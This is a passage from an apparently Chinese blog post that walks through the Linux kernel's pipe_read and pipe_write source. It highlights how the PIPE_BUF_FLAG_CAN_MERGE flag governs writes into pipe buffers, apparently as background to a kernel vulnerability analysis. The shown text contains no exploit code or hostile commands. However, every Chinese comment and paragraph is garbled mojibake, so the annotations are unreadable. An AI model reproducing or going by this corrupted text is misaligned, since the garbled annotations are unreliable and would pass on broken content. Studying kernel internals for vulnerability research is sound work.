8ï¼Œè¯´æ˜ç¼“å†²åŒºç©ºé—´ä¸è¶³ï¼Œè¿”å›é”™è¯¯ç  -ENOBUFSã€‚</span><br>		<span class="hljs-keyword">if</span> (pipe-&gt;note_loss) &#123;<br>			<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification</span> <span class="hljs-title">n</span>;</span><br><br>			<span class="hljs-keyword">if</span> (total_len &lt; <span class="hljs-number">8</span>) &#123;<br>				<span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br>					ret = -ENOBUFS;<br>				<span class="hljs-keyword">break</span>;<br>			&#125;<br><br>			n.type = WATCH_TYPE_META;<br>			n.subtype = WATCH_META_LOSS_NOTIFICATION;<br>			n.info = watch_sizeof(n);<br>			<span class="hljs-keyword">if</span> (copy_to_iter(&amp;n, <span class="hljs-keyword">sizeof</span>(n), to) != <span class="hljs-keyword">sizeof</span>(n)) &#123;<br>				<span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br>					ret = -EFAULT;<br>				<span class="hljs-keyword">break</span>;<br>			&#125;<br>			ret += <span class="hljs-keyword">sizeof</span>(n);<br>			total_len -= <span class="hljs-keyword">sizeof</span>(n);<br>			pipe-&gt;note_loss = <span class="hljs-literal">false</span>;<br>		&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>		<span class="hljs-comment">//å¦‚æœç®¡é“éç©ºï¼Œå°è¯•ä»ç®¡é“ä¸­è¯»å–æ•°æ®</span><br>		<span class="hljs-keyword">if</span> (!pipe_empty(head, tail)) &#123;<br>            <br>			<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[tail &amp; mask];<span class="hljs-comment">//è·å–å½“å‰å°¾éƒ¨æŒ‡é’ˆ tail å¯¹åº”çš„ç®¡é“ç¼“å†²åŒº buf                                     </span><br>			<span class="hljs-type">size_t</span> chars = buf-&gt;len;<span class="hljs-comment">//è®¡ç®—å½“å‰ç¼“å†²åŒºä¸­å¯è¯»å–çš„æ•°æ®é•¿åº¦ chars</span><br>			<span class="hljs-type">size_t</span> written;<br>			<span class="hljs-type">int</span> error;<br>			<span class="hljs-comment">//å¦‚æœç¼“å†²åŒºä¸­çš„æ•°æ®é•¿åº¦å¤§äºå¾…è¯»å–æ•°æ®é•¿åº¦ total_lenï¼Œåˆ™å°†å¾…è¯»å–æ•°æ®é•¿åº¦æ›´æ–°ä¸º total_len</span><br>			<span class="hljs-keyword">if</span> (chars &gt; total_len) &#123;<br>				<span class="hljs-keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_WHOLE) &#123;<br>					<span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br>						ret = -ENOBUFS;<br>					<span class="hljs-keyword">break</span>;<br>				&#125;<br>				chars = total_len;<br>			&#125;<br>			<span class="hljs-comment">//ç¡®è®¤ç®¡é“ç¼“å†²åŒº</span><br>			error = pipe_buf_confirm(pipe, buf);<br>			<span class="hljs-keyword">if</span> (error) &#123;<br>				<span class="hljs-keyword">if</span> (!ret)<br>					ret = error;<br>				<span class="hljs-keyword">break</span>;<br>			&#125;<br>			<span class="hljs-comment">//ä»ç¼“å†²åŒºä¸­è¯»å–æ•°æ®åˆ°ç›®æ ‡ç¼“å†²åŒº to</span><br>			written = copy_page_to_iter(buf-&gt;page, buf-&gt;offset, chars, to);<br>			<span class="hljs-keyword">if</span> (unlikely(written &lt; chars)) &#123;<br>				<span class="hljs-keyword">if</span> (!ret)<br>					ret = -EFAULT;<br>				<span class="hljs-keyword">break</span>;<br>			&#125;<br>            <span class="hljs-comment">//æ›´æ–°è¿”å›å€¼ retã€ç®¡é“ç¼“å†²åŒºä¸­çš„åç§»é‡å’Œé•¿åº¦ï¼Œå¹¶æ¸…ç†ç©ºçš„æ•°æ®åŒ…ç¼“å†²åŒº</span><br>			ret += chars;<br>			buf-&gt;offset += chars;<br>			buf-&gt;len -= chars;<br><br>			<span class="hljs-comment">/* Was it a packet buffer? Clean up and exit */</span><br>			<span class="hljs-keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_PACKET) &#123;<br>				total_len = chars;<br>				buf-&gt;len = <span class="hljs-number">0</span>;<br>			&#125;<br>			<span class="hljs-comment">//å¦‚æœç¼“å†²åŒºå·²ç©ºï¼Œåˆ™é‡Šæ”¾ç¼“å†²åŒºï¼Œå¹¶æ›´æ–°å°¾éƒ¨æŒ‡é’ˆ tail</span><br>			<span class="hljs-keyword">if</span> (!buf-&gt;len) &#123;<br>				pipe_buf_release(pipe, buf);<br>				spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br>				<span class="hljs-keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_LOSS)<br>					pipe-&gt;note_loss = <span class="hljs-literal">true</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>				tail++;<br>				pipe-&gt;tail = tail;<br>				spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br>			&#125;<br>            <span class="hljs-comment">//æ›´æ–°å¾…è¯»å–æ•°æ®é•¿åº¦ total_len</span><br>			total_len -= chars;<br>            <span class="hljs-comment">//å¦‚æœè¯»å–å®Œæˆï¼Œåˆ™è·³å‡ºå¾ªç¯ï¼›å¦åˆ™ç»§ç»­å°è¯•è¯»å–æ›´å¤šæ•°æ®</span><br>			<span class="hljs-keyword">if</span> (!total_len)<br>				<span class="hljs-keyword">break</span>;	<span class="hljs-comment">/* common path: read succeeded */</span><br>			<span class="hljs-keyword">if</span> (!pipe_empty(head, tail))	<span class="hljs-comment">/* More to do? */</span><br>				<span class="hljs-keyword">continue</span>;<br>		&#125;<br>		<span class="hljs-comment">//å¦‚æœç®¡é“ä¸­æ²¡æœ‰å†™å…¥è€…ï¼Œè·³å‡ºå¾ªç¯</span><br>		<span class="hljs-keyword">if</span> (!pipe-&gt;writers)<br>			<span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//å¦‚æœå‡ºç°é”™è¯¯æˆ–å·²ç»è¯»å–åˆ°æ•°æ®ï¼Œåˆ™è·³å‡ºå¾ªç¯</span><br>		<span class="hljs-keyword">if</span> (ret)<br>			<span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//å¦‚æœæ–‡ä»¶æ ‡å¿—ä¸ºéé˜»å¡ï¼Œå¹¶ä¸”ç®¡é“ä¸ºç©ºï¼Œåˆ™è¿”å›é”™è¯¯ç  -EAGAIN</span><br>		<span class="hljs-keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;<br>			ret = -EAGAIN;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>		__pipe_unlock(pipe);<br><br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * We only get here if we didn&#x27;t actually read anything.</span><br><span class="hljs-comment">		 *</span><br><span class="hljs-comment">		 * However, we could have seen (and removed) a zero-sized</span><br><span class="hljs-comment">		 * pipe buffer, and might have made space in the buffers</span><br><span class="hljs-comment">		 * that way.</span><br><span class="hljs-comment">		 *</span><br><span class="hljs-comment">		 * You can&#x27;t make zero-sized pipe buffers by doing an empty</span><br><span class="hljs-comment">		 * write (not even in packet mode), but they can happen if</span><br><span class="hljs-comment">		 * the writer gets an EFAULT when trying to fill a buffer</span><br><span class="hljs-comment">		 * that already got allocated and inserted in the buffer</span><br><span class="hljs-comment">		 * array.</span><br><span class="hljs-comment">		 *</span><br><span class="hljs-comment">		 * So we still need to wake up any pending writers in the</span><br><span class="hljs-comment">		 * _very_ unlikely case that the pipe was full, but we got</span><br><span class="hljs-comment">		 * no data.</span><br><span class="hljs-comment">		 */</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        åœ¨é‡Šæ”¾é”çš„æƒ…å†µä¸‹å¤„ç†æœªè¯»å–ä»»ä½•æ•°æ®çš„æƒ…å†µï¼š</span><br><span class="hljs-comment">		å¦‚æœä¹‹å‰ç®¡é“å·²æ»¡ä½†æœªè¯»å–ä»»ä½•æ•°æ®ï¼Œåˆ™å”¤é†’ç­‰å¾…çš„å†™å…¥è€…å¹¶å‘é€å¼‚æ­¥é€šçŸ¥ã€‚</span><br><span class="hljs-comment">		å¦‚æœå› ä¸­æ–­è€Œé€€å‡ºï¼Œåˆ™è¿”å›é”™è¯¯ç  -ERESTARTSYS</span><br><span class="hljs-comment">		*/</span><br>		<span class="hljs-keyword">if</span> (unlikely(was_full)) &#123;<br>			wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);<br>			kill_fasync(&amp;pipe-&gt;fasync_writers, SIGIO, POLL_OUT);<br>		&#125;<br><br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * But because we didn&#x27;t read anything, at this point we can</span><br><span class="hljs-comment">		 * just return directly with -ERESTARTSYS if we&#x27;re interrupted,</span><br><span class="hljs-comment">		 * since we&#x27;ve done any required wakeups and there&#x27;s no need</span><br><span class="hljs-comment">		 * to mark anything accessed. And we&#x27;ve dropped the lock.</span><br><span class="hljs-comment">		 */</span><br>		<span class="hljs-keyword">if</span> (wait_event_interruptible_exclusive(pipe-&gt;rd_wait, pipe_readable(pipe)) &lt; <span class="hljs-number">0</span>)<br>			<span class="hljs-keyword">return</span> -ERESTARTSYS;<br><br>		__pipe_lock(pipe);<br>		was_full = pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage);<br>		wake_next_reader = <span class="hljs-literal">true</span>;<br>	&#125;<br>	<span class="hljs-keyword">if</span> (pipe_empty(pipe-&gt;head, pipe-&gt;tail))<br>		wake_next_reader = <span class="hljs-literal">false</span>;<br>	__pipe_unlock(pipe);<br><br>	<span class="hljs-keyword">if</span> (was_full) &#123;<br>		wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);<br>		kill_fasync(&amp;pipe-&gt;fasync_writers, SIGIO, POLL_OUT);<br>	&#125;<br>	<span class="hljs-keyword">if</span> (wake_next_reader)<br>		wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);<br>	<span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>)<br>		file_accessed(filp);<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="pipe-write"><a href="#pipe-write" class="headerlink" title="pipe_write"></a>pipe_write</h3><p>å‘<code>pipe</code>ä¸­å†™å…¥ï¼Œä¼šè°ƒç”¨åˆ°<code>pipe_write</code></p>
<p>é¦–å…ˆï¼Œå¦‚æœä¸Šä¸€ä¸ª<code>buffer</code>ä¸­æœ‰å‰©ä½™ç©ºé—´ï¼Œå¹¶ä¸”æ­¤<code>buffer</code>çš„<code>flag</code>æ˜¯<strong>PIPE_BUF_FLAG_CAN_MERGE</strong>ï¼Œä¼šå…ˆå°†æ­¤<code>buffer</code>å†™æ»¡</p>
<p>è‹¥è¿˜æœ‰å¤šçš„æ•°æ®ï¼Œä¼šç”³è¯·æ–°çš„<code>buffer</code>ï¼Œå°†<code>flag</code>è®¾ç½®ä¸º<strong>PIPE_BUF_FLAG_CAN_MERGE</strong>ï¼Œç»§ç»­å†™å…¥</p>
<p>ç”±æ­¤å¯è§ï¼Œ<strong>PIPE_BUF_FLAG_CAN_MERGE</strong>å†³å®šäº†<code>buffer</code>æœ‰æ— å†™å…¥æƒé™</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span><br><span class="hljs-title function_">pipe_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *from)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span> =</span> iocb-&gt;ki_filp;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> filp-&gt;private_data;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head;<br>	<span class="hljs-type">ssize_t</span> ret = <span class="hljs-number">0</span>;<br>	<span class="hljs-type">size_t</span> total_len = iov_iter_count(from);<br>	<span class="hljs-type">ssize_t</span> chars;<br>	<span class="hljs-type">bool</span> was_empty = <span class="hljs-literal">false</span>;<br>	<span class="hljs-type">bool</span> wake_next_writer = <span class="hljs-literal">false</span>;<br><br>	<span class="hljs-comment">/* Null write succeeds. */</span><br>    <span class="hljs-comment">//å¦‚æœå¾…å†™å…¥æ•°æ®é•¿åº¦ä¸ºé›¶ï¼Œåˆ™ç›´æ¥è¿”å›æˆåŠŸ</span><br>	<span class="hljs-keyword">if</span> (unlikely(total_len == <span class="hljs-number">0</span>))<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	<span class="hljs-comment">//é”å®šç®¡é“ä»¥ç¡®ä¿å¹¶å‘å†™å…¥æ—¶çš„æ•°æ®ä¸€è‡´æ€§</span><br>	__pipe_lock(pipe);<br>	<span class="hljs-comment">//æ£€æŸ¥æ˜¯å¦æœ‰è¯»å–è€…ï¼Œå¦‚æœæ²¡æœ‰è¯»å–è€…ï¼Œåˆ™å‘é€ SIGPIPE ä¿¡å·å¹¶è¿”å›é”™è¯¯ç  -EPIPE</span><br>	<span class="hljs-keyword">if</span> (!pipe-&gt;readers) &#123;<br>		send_sig(SIGPIPE, current, <span class="hljs-number">0</span>);<br>		ret = -EPIPE;<br>		<span class="hljs-keyword">goto</span> out;<br>	&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br>    <span class="hljs-comment">//æ£€æŸ¥æ˜¯å¦å¯ç”¨äº†ç›‘è§†é˜Ÿåˆ—ï¼Œå¦‚æœå¯ç”¨äº†ï¼Œåˆ™è¿”å›é”™è¯¯ç  -EXDEV</span><br>	<span class="hljs-keyword">if</span> (pipe-&gt;watch_queue) &#123;<br>		ret = -EXDEV;<br>		<span class="hljs-keyword">goto</span> out;<br>	&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * Only wake up if the pipe started out empty, since</span><br><span class="hljs-comment">	 * otherwise there should be no readers waiting.</span><br><span class="hljs-comment">	 *</span><br><span class="hljs-comment">	 * If it wasn&#x27;t empty we try to merge new data into</span><br><span class="hljs-comment">	 * the last buffer.</span><br><span class="hljs-comment">	 *</span><br><span class="hljs-comment">	 * That naturally merges small writes, but it also</span><br><span class="hljs-comment">	 * page-aligs the rest of the writes for large writes</span><br><span class="hljs-comment">	 * spanning multiple pages.</span><br><span class="hljs-comment">	 */</span><br>	head = pipe-&gt;head;<br>	was_empty = pipe_empty(head, pipe-&gt;tail);<span class="hljs-comment">//åˆ¤æ–­ç®¡é“æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ºç©ºï¼Œåˆ™æ ‡è®° was_empty ä¸ºçœŸ</span><br>	chars = total_len &amp; (PAGE_SIZE<span class="hljs-number">-1</span>);<br>	<span class="hljs-keyword">if</span> (chars &amp;&amp; !was_empty) &#123;<span class="hljs-comment">//å¦‚æœæ–°æ•°æ®é•¿åº¦ä¸ä¸ºé›¶ä¸”ç®¡é“ä¸ä¸ºç©ºï¼Œåˆ™å°è¯•å°†æ–°æ•°æ®ä¸ä¸Šä¸€ä¸ªç¼“å†²åŒºåˆå¹¶</span><br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="hljs-number">1</span>) &amp; mask];<br>		<span class="hljs-type">int</span> offset = buf-&gt;offset + buf-&gt;len;<br>		<span class="hljs-comment">//å¦‚æœflagä¸­æœ‰PIPE_BUF_FLAG_CAN_MERGEï¼Œä¾¿æŠŠæ•°æ®å†™å…¥ä¸Šä¸€ä¸ªbufferçš„å‰©ä½™ç©ºé—´ä¸­</span><br>		<span class="hljs-keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;<br>		    offset + chars &lt;= PAGE_SIZE) &#123;<br>			ret = pipe_buf_confirm(pipe, buf);<br>			<span class="hljs-keyword">if</span> (ret)<br>				<span class="hljs-keyword">goto</span> out;<br><br>			ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);<span class="hljs-comment">//æ‹·è´è¿›å»</span><br>			<span class="hljs-keyword">if</span> (unlikely(ret &lt; chars)) &#123;<br>				ret = -EFAULT;<br>				<span class="hljs-keyword">goto</span> out;<br>			&#125;<br><br>			buf-&gt;len += ret;<br>			<span class="hljs-keyword">if</span> (!iov_iter_count(from))<br>				<span class="hljs-keyword">goto</span> out;<br>		&#125;<br>	&#125;<br>	<span class="hljs-comment">//è¿›å…¥ä¸€ä¸ªæ— é™å¾ªç¯ï¼Œç›´åˆ°æˆåŠŸå†™å…¥æ•°æ®æˆ–é‡åˆ°é”™è¯¯</span><br>	<span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-comment">//æ£€æŸ¥æ˜¯å¦æœ‰è¯»å–è€…ï¼Œå¦‚æœæ²¡æœ‰è¯»å–è€…ï¼Œåˆ™å‘é€ SIGPIPE ä¿¡å·å¹¶è¿”å›é”™è¯¯ç  -EPIPE</span><br>		<span class="hljs-keyword">if</span> (!pipe-&gt;readers) &#123;<br>			send_sig(SIGPIPE, current, <span class="hljs-number">0</span>);<br>			<span class="hljs-keyword">if</span> (!ret)<br>				ret = -EPIPE;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>		<span class="hljs-comment">//æ£€æŸ¥ç®¡é“æ˜¯å¦æœªæ»¡ï¼Œå¦‚æœæœªæ»¡ï¼Œåˆ™åˆ†é…ä¸€ä¸ªæ–°çš„ç¼“å†²åŒºç”¨äºå†™å…¥æ•°æ®</span><br>		head = pipe-&gt;head;<br>		<span class="hljs-keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<br>			<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br>			<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];<br>			<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> pipe-&gt;tmp_page;<br>			<span class="hljs-type">int</span> copied;<br><br>			<span class="hljs-keyword">if</span> (!page) &#123;<br>				page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);<br>				<span class="hljs-keyword">if</span> (unlikely(!page)) &#123;<br>					ret = ret ? : -ENOMEM;<br>					<span class="hljs-keyword">break</span>;<br>				&#125;<br>				pipe-&gt;tmp_page = page;<br>			&#125;<br><br>			<span class="hljs-comment">/* Allocate a slot in the ring in advance and attach an</span><br><span class="hljs-comment">			 * empty buffer.  If we fault or otherwise fail to use</span><br><span class="hljs-comment">			 * it, either the reader will consume it or it&#x27;ll still</span><br><span class="hljs-comment">			 * be there for the next write.</span><br><span class="hljs-comment">			 */</span><br>			spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);<br><br>			head = pipe-&gt;head;<br>			<span class="hljs-keyword">if</span> (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<br>				spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br>				<span class="hljs-keyword">continue</span>;<br>			&#125;<br><br>			pipe-&gt;head = head + <span class="hljs-number">1</span>;<br>			spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br><br>			<span class="hljs-comment">/* Insert it into the buffer array */</span><br>			buf = &amp;pipe-&gt;bufs[head &amp; mask];<br>			buf-&gt;page = page;<br>			buf-&gt;ops = &amp;anon_pipe_buf_ops;<br>			buf-&gt;offset = <span class="hljs-number">0</span>;<br>			buf-&gt;len = <span class="hljs-number">0</span>;<br>			<span class="hljs-keyword">if</span> (is_packetized(filp))<span class="hljs-comment">//è®¾ç½® buffer çš„ flagï¼Œè‹¥è®¾ç½®äº† O_DIRECT åˆ™ä¸º PACKET</span><br>				buf-&gt;flags = PIPE_BUF_FLAG_PACKET;<br>			<span class="hljs-keyword">else</span><br>				buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;<br>			pipe-&gt;tmp_page = <span class="hljs-literal">NULL</span>;<br><br>			copied = copy_page_from_iter(page, <span class="hljs-number">0</span>, PAGE_SIZE, from);<br>			<span class="hljs-keyword">if</span> (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) &#123;<br>				<span class="hljs-keyword">if</span> (!ret)<br>					ret = -EFAULT;<br>				<span class="hljs-keyword">break</span>;<br>			&#125;<br>			ret += copied;<br>			buf-&gt;offset = <span class="hljs-number">0</span>;<br>			buf-&gt;len = copied;<br><br>			<span class="hljs-keyword">if</span> (!iov_iter_count(from))<br>				<span class="hljs-keyword">break</span>;<br>		&#125;<br><br>		<span class="hljs-keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage))<br>			<span class="hljs-keyword">continue</span>;<br><br>		<span class="hljs-comment">/* Wait for buffer space to become available. */</span><br>        <span class="hljs-comment">//å¦‚æœæ–‡ä»¶æ ‡å¿—ä¸ºéé˜»å¡ï¼Œåˆ™è¿”å›é”™è¯¯ç  -EAGAIN</span><br>		<span class="hljs-keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;<br>			<span class="hljs-keyword">if</span> (!ret)<br>				ret = -EAGAIN;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>        <span class="hljs-comment">//å¦‚æœå½“å‰è¿›ç¨‹æœ‰ä¿¡å·ç­‰å¾…ï¼Œåˆ™è¿”å›é”™è¯¯ç  -ERESTARTSYS</span><br>		<span class="hljs-keyword">if</span> (signal_pending(current)) &#123;<br>			<span class="hljs-keyword">if</span> (!ret)<br>				ret = -ERESTARTSYS;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br><br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * We&#x27;re going to release the pipe lock and wait for more</span><br><span class="hljs-comment">		 * space. We wake up any readers if necessary, and then</span><br><span class="hljs-comment">		 * after waiting we need to re-check whether the pipe</span><br><span class="hljs-comment">		 * become empty while we dropped the lock.</span><br><span class="hljs-comment">		 */</span><br>        <span class="hljs-comment">//é‡Šæ”¾ç®¡é“é”å¹¶ç­‰å¾…ç¼“å†²åŒºç©ºé—´å˜å¾—å¯ç”¨ï¼Œå”¤é†’ä»»ä½•å¯èƒ½æ­£åœ¨ç­‰å¾…è¯»å–çš„è¿›ç¨‹ã€‚å¾…ç­‰å¾…ç»“æŸåï¼Œé‡æ–°è·å–ç®¡é“é”å¹¶é‡æ–°æ£€æŸ¥ç®¡é“æ˜¯å¦ä¸ºç©ºï¼Œä»¥ç¡®å®šæ˜¯å¦éœ€è¦ç»§ç»­æ‰§è¡Œå†™å…¥æ“ä½œã€‚</span><br>		__pipe_unlock(pipe);<br>		<span class="hljs-keyword">if</span> (was_empty) &#123;<br>			wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);<br>			kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);<br>		&#125;<br>		wait_event_interruptible_exclusive(pipe-&gt;wr_wait, pipe_writable(pipe));<br>		__pipe_lock(pipe);<br>		was_empty = pipe_empty(pipe-&gt;head, pipe-&gt;tail);<br>		wake_next_writer = <span class="hljs-literal">true</span>;<br>	&#125;<br>out:<br>    <span class="hljs-comment">//åœ¨å†™å…¥å®Œæˆåï¼Œå¦‚æœä¹‹å‰ç®¡é“å·²æ»¡ï¼Œåˆ™å–æ¶ˆå”¤é†’ä¸‹ä¸€ä¸ªå†™å…¥è€…çš„æ“ä½œ</span><br>	<span class="hljs-keyword">if</span> (pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage))<br>		wake_next_writer = <span class="hljs-literal">false</span>;<br>	__pipe_unlock(pipe);<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * If we do do a wakeup event, we do a &#x27;sync&#x27; wakeup, because we</span><br><span class="hljs-comment">	 * want the reader to start processing things asap, rather than</span><br><span class="hljs-comment">	 * leave the data pending.</span><br><span class="hljs-comment">	 *</span><br><span class="hljs-comment">	 * This is particularly important for small writes, because of</span><br><span class="hljs-comment">	 * how (for example) the GNU make jobserver uses small writes to</span><br><span class="hljs-comment">	 * wake up pending jobs</span><br><span class="hljs-comment">	 */</span><br>    <span class="hljs-comment">//è§£é”ç®¡é“ï¼Œå¹¶æ 